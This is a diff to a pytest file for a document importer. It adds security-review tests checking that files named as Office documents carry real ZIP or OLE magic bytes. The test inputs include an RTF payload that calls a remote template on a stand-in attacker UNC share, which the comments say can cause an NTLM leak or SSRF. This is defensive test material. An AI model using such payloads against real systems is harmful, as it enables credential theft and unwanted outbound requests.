@@ -67,8 +67,11 @@ from universal_importer.converters import block_remote_link as block
 ])
 def test_html_link_blocks_remote_and_local(uri):
     # Only self-contained inline content may load; everything else is dropped,
-    # so a malicious HTML/.eml/.msg cannot embed a local file or call out.
-    assert block(uri, "") is None
+    # so a malicious HTML/.eml/.msg cannot embed a local file or call out. The result is
+    # an inert data: placeholder — NEVER None (xhtml2pdf falls back to the original uri then;
+    # see tests/test_html_import_e2e.py).
+    from universal_importer.converters import _BLOCKED_PLACEHOLDER
+    assert block(uri, "") == _BLOCKED_PLACEHOLDER
 
 
 @pytest.mark.parametrize("uri", [
@@ -173,3 +176,51 @@ def test_txt_to_pdf_wraps_long_line_without_truncation():
     with fitz.open(stream=pdf, filetype="pdf") as doc:
         text = "".join(page.get_text() for page in doc)
     assert text.count("X") == 20_000  # nothing dropped off the page edge
+
+
+# --- Office content gate (security review 2026-11-25, H-4) ------------------------------
+# scan_ooxml_external_targets() is fail-open for "not a ZIP" (legacy OLE has no .rels). Word
+# picks its parser by CONTENT, so an RTF/MHT/HTML file named .docx slipped past the scan and
+# could still pull a remote template (UNC NTLM leak / SSRF) on open. The extension must match
+# the real container: ZIP for OOXML/ODF, OLE compound file for legacy .doc/.xls/.ppt.
+_OLE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 8
+
+
+@pytest.mark.parametrize("ext", [".docx", ".xlsx", ".pptx", ".odt", ".ods", ".odp"])
+@pytest.mark.parametrize("payload", [
+    rb"{\rtf1{\*\template \\attacker\share\evil.dotm}}",   # RTF with remote template
+    b"MIME-Version: 1.0\r\nContent-Type: multipart/related",  # MHT
+    b"<html><body><link rel=attachedTemplate href=x></body></html>",
+    _OLE,                                                    # legacy file renamed to OOXML
+])
+def test_zip_based_office_extension_requires_zip_magic(ext, payload):
+    with pytest.raises(ValueError, match="Unerwarteter Inhalt"):
+        verify(payload, ext, "x" + ext)
+
+
+@pytest.mark.parametrize("ext", [".doc", ".xls", ".ppt"])
+@pytest.mark.parametrize("payload", [
+    rb"{\rtf1{\*\template \\attacker\share\evil.dotm}}",
+    b"<html><body>x</body></html>",
+    b"PK\x03\x04" + b"\x00" * 12,                            # a ZIP named .doc
+])
+def test_legacy_office_extension_requires_ole_magic(ext, payload):
+    with pytest.raises(ValueError, match="Unerwarteter Inhalt"):
+        verify(payload, ext, "x" + ext)
+
+
+@pytest.mark.parametrize("ext", [".docx", ".xlsx", ".pptx", ".odt", ".ods", ".odp"])
+def test_real_zip_office_files_pass_the_gate(ext):
+    verify(b"PK\x03\x04" + b"\x14\x00\x06\x00" + b"\x00" * 8, ext, "ok" + ext)
+
+
+@pytest.mark.parametrize("ext", [".doc", ".xls", ".ppt"])
+def test_real_ole_office_files_pass_the_gate(ext):
+    verify(_OLE, ext, "ok" + ext)
+
+
+def test_path_import_refuses_rtf_disguised_as_docx(tmp_path):
+    f = tmp_path / "Rechnung.docx"
+    f.write_bytes(rb"{\rtf1{\*\template \\attacker\share\evil.dotm}}")
+    with pytest.raises(ValueError, match="Unerwarteter Inhalt"):
+        UniversalImporter.convert(str(f))
